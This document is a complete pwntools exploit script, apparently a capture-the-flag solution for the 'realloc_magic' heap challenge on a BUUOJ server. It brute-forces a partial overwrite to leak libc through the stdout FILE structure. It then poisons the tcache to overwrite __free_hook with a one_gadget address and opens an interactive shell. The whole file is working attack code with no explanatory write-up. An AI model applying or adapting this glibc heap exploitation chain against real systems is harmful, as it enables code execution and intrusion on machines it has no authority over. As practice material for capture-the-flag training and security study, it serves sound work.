#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
while True:
    try:
        if debug == 1:
            p = process('./realloc_magic')
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
        else:
            p = remote('node3.buuoj.cn', 29670)
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
        elf = ELF('./realloc_magic', checksec=False)
        libc_one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]


        def realloc(realloc_size, realloc_content):
            p.sendafter('>> ', '1')
            p.sendafter('Size?\n', str(realloc_size))
            p.sendafter('Content?\n', realloc_content)


        def free():
            p.sendafter('>> ', '2')


        def ba():
            p.sendafter('>> ', '666')


        realloc(0x10, 'a')
        realloc(0, '')
        realloc(0x100, 'b')
        realloc(0, '')
        realloc(0x80, 'c')
        realloc(0, '')
        realloc(0x100, 'b')
        for i in range(0, 7):
            free()
        realloc(0, '')
        realloc(0x10, 'a')

        pd = 'a' * 0x10
        pd += p64(0) + p64(0x21)
        pd += p16(0xa760)
        realloc(0x120, pd)
        realloc(0, '')
        realloc(0x100, 'a')
        realloc(0, '')

        pd = p64(0xfbad1887)
        pd += p64(0) * 3
        pd += '\x00'
        realloc(0x100, pd)
        p.recv(0x88)

        addr__IO_2_1_stdout_ = u64(p.recv(6).ljust(8, '\x00')) - 131
        libcbase = addr__IO_2_1_stdout_ - libc.sym['_IO_2_1_stdout_']
        addr___free_hook = libcbase + libc.sym['__free_hook']
        addr_one_gadget = libcbase + libc_one_gadget[1]

        if addr__IO_2_1_stdout_ & 0xff != 96:
            p.close()
            continue
        else:
            pause()

        ba()
        realloc(0x20, 'A')
        realloc(0, '')
        realloc(0x140, 'B')
        realloc(0, '')
        realloc(0x110, 'C')
        realloc(0, '')
        realloc(0x140, 'B')
        for i in range(0, 7):
            free()
        realloc(0, '')
        realloc(0x20, 'A')

        pd = 'a' * 0x20
        pd += p64(0) + p64(0x221)
        pd += p64(addr___free_hook)
        realloc(0x170, pd)
        realloc(0, '')
        realloc(0x140, 'a')
        realloc(0, '')
        realloc(0x140, p64(addr_one_gadget))

        free()
        success('addr__IO_2_1_stdout_ = ' + hex(addr__IO_2_1_stdout_))
        success('addr___free_hook     = ' + hex(addr___free_hook))
        # sleep(1)
        # gdb.attach(p)
        p.interactive()
        break
    except:
        p.close()
        continue
